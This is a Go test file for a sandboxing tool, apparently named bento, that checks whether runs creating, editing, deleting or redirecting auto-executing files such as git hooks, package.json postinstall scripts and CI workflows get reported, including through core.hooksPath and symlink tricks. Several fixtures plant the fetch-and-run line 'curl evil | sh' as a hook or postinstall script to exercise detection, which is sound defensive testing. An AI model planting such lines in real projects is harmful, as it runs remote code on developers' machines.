//go:build linux

package linux

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/whiskeyjimbo/bento/enforce"
	"github.com/whiskeyjimbo/bento/policy"
)

// The report exists to point a reviewer at the auto-executing files a run touched, so
// every way a run can touch one has to reach the list: an edit, a create, and a delete.
// A snapshot that only recorded what existed before would miss the last two, which are
// the shapes that plant and unplant a hook.
func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
	grant := t.TempDir()
	write := func(rel, body string) string {
		p := filepath.Join(grant, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	edited := write("package.json", `{"scripts":{}}`)
	removed := write("conftest.py", "import pytest\n")
	untouched := write("build.rs", "fn main() {}\n")
	workflow := write(".github/workflows/ci.yml", "on: push\n")

	before := baselineAutoExec([]string{grant})

	// A same-size rewrite is invisible to a size compare alone, so the edit keeps the
	// length and moves only the mtime - the half of the stamp a test writing a longer
	// string would never exercise.
	if err := os.WriteFile(edited, []byte(`{"scripts":{"postinstall":"x"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(workflow, time.Time{}, time.Now().Add(time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(removed); err != nil {
		t.Fatal(err)
	}
	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")

	got, _, _ := before.changed([]string{grant})
	want := []string{created, edited, removed, workflow}
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("changed = %v, want %v", got, want)
	}
	if slices.Contains(got, untouched) {
		t.Errorf("%s was not changed but is reported", untouched)
	}
}

// The whole point of resolving core.hooksPath is the value nobody hard-codes, so the
// test uses one: a directory of the repo's own naming, reached only because git was
// asked. The absolute case is the one seen in the wild - a hooks dir in another checkout
// entirely - and it must be dropped, because a path outside every write grant is not one
// the run could have planted.
func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
	grant := t.TempDir()
	elsewhere := t.TempDir()
	git := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = grant
		cmd.Env = slices.DeleteFunc(os.Environ(), func(kv string) bool {
			return strings.HasPrefix(kv, "GIT_")
		})
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
	git("init", "-q")
	git("config", "core.hooksPath", "scripts/githooks")
	inTree := filepath.Join(grant, "scripts", "githooks")
	if err := os.MkdirAll(inTree, 0o755); err != nil {
		t.Fatal(err)
	}

	// bento is reachable from inside a hook or a `git rebase --exec`, which export
	// GIT_DIR. It overrides cmd.Dir outright, so an inherited one would resolve some
	// other repo's hooks and silently report on a directory this grant never had.
	t.Setenv("GIT_DIR", filepath.Join(elsewhere, "decoy.git"))

	before := baselineAutoExec([]string{grant})
	planted := filepath.Join(inTree, "pre-commit")
	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, _, _ := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
		t.Errorf("changed = %v, want %v", got, []string{planted})
	}

	git("config", "core.hooksPath", filepath.Join(elsewhere, "hooks"))
	if err := os.MkdirAll(filepath.Join(elsewhere, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
	}

	// core.hooksPath is fixed for the run, but the directory it names is an ordinary
	// project path the run can replace with a symlink. Judged by name alone that stays
	// inside the grant, and the after-snapshot walks wherever it points - which would
	// let a run fill its own report with host files it never touched.
	git("config", "core.hooksPath", "scripts/githooks")
	if err := os.RemoveAll(inTree); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(elsewhere, "hooks"), inTree); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "post-commit"), []byte("x\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a hooks dir symlinked out of the grant is out of scope, got %v", got)
	}
}

// A write grant with no enclosing checkout has no .git for the shields to hold down, so
// core.hooksPath is not fixed for the run by anything the shields do: the target can git
// init inside the grant and point it at another write grant. The baseline resolving it
// once, before the target runs, is what keeps the after-snapshot from walking wherever the
// run just pointed it and reporting a directory it never touched as newly created.
func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	grant := t.TempDir()
	other := t.TempDir()
	if err := os.WriteFile(filepath.Join(other, "already-here"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// No repo anywhere above the grant, which is the whole point: nothing is shielded.
	writes := []string{grant, other}
	before := baselineAutoExec(writes)

	git := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = grant
		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	git("init", "-q")
	git("config", "core.hooksPath", other)

	// The directory, and only the directory. Naming the files inside it would report a
	// pre-existing file as newly created, since the baseline never stamped it; naming
	// nothing would leave the operator unaware that the run chose where the host's next
	// commit executes from. It travels apart from the changed FILES, because the run need
	// never have written anything in there for the redirection to be worth saying.
	changed, redirected, _ := before.changed(writes)
	if !slices.Equal(redirected, []string{other}) {
		t.Errorf("redirected = %v, want just the redirected hooks directory %v", redirected, []string{other})
	}
	if len(changed) != 0 {
		t.Errorf("the run changed no auto-executing file, but changed = %v", changed)
	}
	if slices.Contains(redirected, filepath.Join(other, "already-here")) {
		t.Error("a file the baseline never stamped must not be reported as one the run created")
	}
}

// The same redirection reached the other way: no repo above the grant, so the run makes
// one and its .git/hooks becomes the host's hook directory. There was no .git at
// preflight, so gitDirShields carved nothing and no shield holds it down - which is
// exactly why the report has to name it.
func TestHooksInARunCreatedRepoAreReported(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	grant := t.TempDir()
	writes := []string{grant}
	before := baselineAutoExec(writes)

	cmd := exec.Command("git", "init", "-q")
	cmd.Dir = grant
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git init: %v\n%s", err, out)
	}
	if err := os.WriteFile(filepath.Join(grant, ".git", "hooks", "pre-commit"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	changed, redirected, _ := before.changed(writes)
	if !slices.Contains(redirected, filepath.Join(grant, ".git", "hooks")) {
		t.Errorf("a hooks directory the run created must be named; got %v", redirected)
	}
	if slices.Contains(changed, filepath.Join(grant, ".git", "hooks")) {
		t.Errorf("the directory is not a changed file and must not be reported as one; got %v", changed)
	}
}

// The blind spots are deliberate and documented on enforce.Result.ChangedAutoExec, so
// they are pinned: a widening that closes one should be a decision someone made, and a
// narrowing that opens a new one should fail here rather than silently drop a hint.
func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
	grant := t.TempDir()
	nested := filepath.Join(grant, "packages", "web")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatal(err)
	}
	before := baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
	}

	// A grant that is a plain file, or names nothing on this host, must not panic or
	// invent a change - resolveGrants admits both shapes.
	missing := filepath.Join(grant, "not-there")
	file := filepath.Join(grant, "setup.py")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{missing, file})
	if got, redirected, _ := before.changed([]string{missing, file}); len(got)+len(redirected) != 0 {
		t.Errorf("an unchanged run reported %v", got)
	}
}

// The snapshot is only worth anything if a real run carries it into the Result, and the
// two halves are wired separately - the baseline before the target starts, the compare
// after it exits. A unit test of changedAutoExec passes with either end unhooked.
func TestRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
	requireSandbox(t)

	dir := t.TempDir()
	touched := filepath.Join(dir, "package.json")
	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	left := filepath.Join(dir, "conftest.py")
	if err := os.WriteFile(left, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(dir, "p.sh")
	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}

	res, err := sandboxEnforcer(t).Run(context.Background(), p, enforce.Process{}, enforce.RunOptions{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !slices.Contains(res.ChangedAutoExec, touched) {
		t.Errorf("the run rewrote %s but the result does not report it; ChangedAutoExec=%v", touched, res.ChangedAutoExec)
	}
	if slices.Contains(res.ChangedAutoExec, left) {
		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
	}
}

// The degraded tier has its own baseline and its own compare, wired at three separate
// points, and the unit test above passes with either end of that pair dead. It is also
// the tier with no mount namespace and no shields at all, so it is where a missing hint
// costs most. Driven through runDegraded directly, as the other degraded tests are: a
// userns-capable host would otherwise take the bwrap path.
func TestDegradedRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
	requireDegraded(t)

	dir := t.TempDir()
	touched := filepath.Join(dir, "package.json")
	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	left := filepath.Join(dir, "build.rs")
	if err := os.WriteFile(left, []byte("fn main() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(dir, "p.sh")
	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}

	var out strings.Builder
	res, err := enforcerUsing(testBento(t)).runDegraded(context.Background(), p,
		enforce.Process{Stdout: &out, Stderr: &out}, enforce.RunOptions{})
	if err != nil {
		t.Fatalf("runDegraded: %v\noutput:\n%s", err, out.String())
	}
	if !slices.Contains(res.ChangedAutoExec, touched) {
		t.Errorf("the degraded run rewrote %s but the result does not report it; ChangedAutoExec=%v\noutput:\n%s", touched, res.ChangedAutoExec, out.String())
	}
	if slices.Contains(res.ChangedAutoExec, left) {
		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
	}
}

// git printing an empty answer for the hooks path. The value decides which directory the
// snapshot walks, and joining an empty one against the grant would make the grant root
// itself the hook directory - a whole checkout reported as auto-executing files.
func TestAnEmptyGitAnswerNamesNoHookDir(t *testing.T) {
	shim := t.TempDir()
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\necho\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	grant := t.TempDir()
	got, err := hookRunnerDir(grant, []string{grant})
	if err != nil {
		t.Fatalf("hookRunnerDir: %v", err)
	}
	if got != "" {
		t.Errorf("hookRunnerDir = %q, want no answer; an empty git answer named a directory", got)
	}
}

// A git that does not answer must not read like a checkout with no hook directory: the
// hook report is empty either way, and only the unresolved list says which happened.
func TestAGitThatCannotAnswerNamesTheGrant(t *testing.T) {
	shim := t.TempDir()
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexit 127\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	grant := t.TempDir()

	if _, err := hookRunnerDir(grant, []string{grant}); err == nil {
		t.Error("hookRunnerDir returned no error for a git exiting 127")
	}
	hooks, unresolved := hookRunnerDirs([]string{grant})
	if len(hooks) != 0 {
		t.Errorf("hookRunnerDirs named %v, want none; git could not answer", hooks)
	}
	if !slices.Contains(unresolved, grant) {
		t.Errorf("unresolved = %v, want it to name %s", unresolved, grant)
	}
	if _, _, unresolved := baselineAutoExec([]string{grant}).changed([]string{grant}); !slices.Contains(unresolved, grant) {
		t.Errorf("changed reported unresolved = %v, want it to name %s", unresolved, grant)
	}
}

// A git that never returns must not hang the preflight: the deadline is what turns an
// unresponsive object store into a reported failure instead of a run that never starts.
func TestAGitThatNeverAnswersIsBounded(t *testing.T) {
	shim := t.TempDir()
	// An absolute sleep: PATH is about to become the shim directory alone, and a bare
	// name would exit 127 and answer the test with the wrong failure.
	sleep, err := exec.LookPath("sleep")
	if err != nil {
		t.Skipf("no sleep on this host: %v", err)
	}
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexec "+sleep+" 30\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	hookResolveTimeout = 100 * time.Millisecond
	t.Cleanup(func() { hookResolveTimeout = 5 * time.Second })

	grant := t.TempDir()
	done := make(chan error, 1)
	go func() {
		_, err := hookRunnerDir(grant, []string{grant})
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("hookRunnerDir returned no error for a git that never answered")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("hookRunnerDir did not return: the hook resolution has no deadline")
	}
}

// A path that cannot be walked is compared as written, whatever the reason. EvalSymlinks
// needs the same traversal the stamping ReadDir needs, so a name it cannot resolve is one
// nothing else walks either - and answering "" there would collapse the containment test
// onto the grant root.
func TestAnUnresolvablePathIsComparedAsWritten(t *testing.T) {
	dir := t.TempDir()
	dangling := filepath.Join(dir, "link")
	if err := os.Symlink(filepath.Join(dir, "nothing-here"), dangling); err != nil {
		t.Fatal(err)
	}
	if got := resolved(dangling); got != dangling {
		t.Errorf("resolved = %q, want the path as written", got)
	}
}

// The after-run snapshot is the last thing Run does with the write grants, with the
// target already exited and the sandbox torn down. Unbounded, a grant whose mount died
// during the run - after the deadMount gate let the launch through - blocks Run forever
// there, with no output and no exit. The baseline was wrapped against exactly this on
// both tiers and the re-ask was not carried along.
func TestTheAfterRunAutoExecSnapshotIsBounded(t *testing.T) {
	grant := t.TempDir()
	if err := os.WriteFile(filepath.Join(grant, "package.json"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	before := baselineAutoExec([]string{grant})

	setWalkTimeout(t, 100*time.Millisecond)
	hung := make(chan struct{})
	t.Cleanup(func() { close(hung) })
	real := autoExecStat
	autoExecStat = func(p string) (os.FileInfo, error) { <-hung; return real(p) }
	t.Cleanup(func() { autoExecStat = real })

	done := make(chan []string, 1)
	go func() {
		changed, _, unresolved := before.changed([]string{grant})
		done <- append(changed, unresolved...)
	}()
	select {
	case got := <-done:
		// The grant is named unresolved rather than its files reported changed: an
		// expired snapshot is empty, and comparing an empty one against the baseline
		// would report every file the baseline stamped as removed by the run - a report
		// invented out of a mount that stopped answering.
		if !slices.Equal(got, []string{grant}) {
			t.Errorf("changed+unresolved = %v, want just the grant %q; a snapshot that never answered must make the report short, not fabricate one", got, grant)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("changed() never returned: a write grant whose mount died during the run hangs Run after the target has exited, with nothing left to print")
	}
}

// resolved is reached from hookRunnerDir after its bounded git call has returned, and
// again from changed()'s redirect question. EvalSymlinks lstats every component, so a
// hook directory on a dead mount blocks it exactly as thoroughly as the git call the
// bound beside it exists for.
func TestResolvedIsBounded(t *testing.T) {
	setWalkTimeout(t, 100*time.Millisecond)
	hung := make(chan struct{})
	t.Cleanup(func() { close(hung) })
	real := evalSymlinks
	evalSymlinks = func(p string) (string, error) { <-hung; return real(p) }
	t.Cleanup(func() { evalSymlinks = real })

	done := make(chan string, 1)
	go func() { done <- resolved("/export/checkout/.git/hooks") }()
	select {
	case got := <-done:
		if got != "/export/checkout/.git/hooks" {
			t.Errorf("resolved = %q, want the path itself - the answer it already gives for a path it cannot walk", got)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("resolved never returned: a hook directory on a dead mount hangs the run there")
	}
}
